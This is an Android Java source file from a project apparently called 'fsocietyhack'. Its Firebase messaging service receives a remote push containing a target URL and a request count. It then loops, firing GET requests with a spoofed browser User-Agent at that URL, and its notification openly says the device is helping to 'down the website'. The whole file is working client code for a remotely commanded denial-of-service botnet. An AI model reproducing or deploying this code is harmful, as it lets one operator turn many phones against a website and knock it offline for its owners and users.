package com.brunoeleodoro.org.fsocietyhack;

import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.TaskStackBuilder;
import android.text.Html;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;

/**
 * Created by bruno on 20/12/17.
 */
/*
{
	"data" : {
    "titulo":"teste de notificação",
    "desc":"kfdjsalkfdsa"
  },
	"notification" : {
		"titulo":"teste de notificação",
    	"desc":"kfdjsalkfdsa"
	},
	"priority":"high",
  "to" : "/topics/ping_all"
}
 */

public class FirebaseMessageReceiver extends FirebaseMessagingService {

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
    }

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        super.onMessageReceived(remoteMessage);
        Log.i("Script","Fsociety firebase received, size="+remoteMessage.getData().size());
        //Log.i("Script","aries firebase="+remoteMessage.getData());
        if(remoteMessage.getData().size() > 0)
        {
            //Se quiser mostrar uma notificação para fins de testes, basta descomentar essa linha abaixo
            mostrarNotificacao("Hello Friend","Thanks for let your device make "+remoteMessage.getData().get("limite")+" requests to down the website \n"+remoteMessage.getData().get("url"));
            getDados(remoteMessage.getData().get("url"),Integer.parseInt(remoteMessage.getData().get("limite")));
        }
    }

    public void mostrarNotificacao(String titulo,String msg)
    {
        NotificationCompat.Builder mBuilder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.ic_stat_name)
                        .setContentTitle(titulo)
                        .setContentText(""+Html.fromHtml(msg))
                        .setStyle(new NotificationCompat.BigTextStyle().bigText(""+Html.fromHtml(msg)));

        Intent resultIntent = new Intent(this, MainActivity.class);
        TaskStackBuilder stackBuilder = TaskStackBuilder.create(this);
        stackBuilder.addParentStack(MainActivity.class);
        stackBuilder.addNextIntent(resultIntent);
        PendingIntent resultPendingIntent =
                stackBuilder.getPendingIntent(
                        0,
                        PendingIntent.FLAG_UPDATE_CURRENT
                );
        mBuilder.setContentIntent(resultPendingIntent);

        NotificationManager mNotificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        mNotificationManager.notify(001, mBuilder.build());
    }
    public void getDados(String url,int limite) {
        int i = 0;
        if(limite==0)
        {
            limite =5;
        }
        while(i < limite)
        {
            RequestQueue queue = Volley.newRequestQueue(this);
            StringRequest request = new StringRequest(Request.Method.GET, url, new Response.Listener<String>() {
                @Override
                public void onResponse(String s) {
                    Log.i("Script","response="+s);

                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError volleyError) {

                }
            })
            {
                public HashMap<String,String> getHeaders()
                {
                    HashMap<String,String> dados = new HashMap<>();
                    dados.put("User-Agent", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0");
                    dados.put("Content-Type", "application/form-data");
                    return dados;
                }
            };
            queue.add(request);
            i++;
        }

    }

}
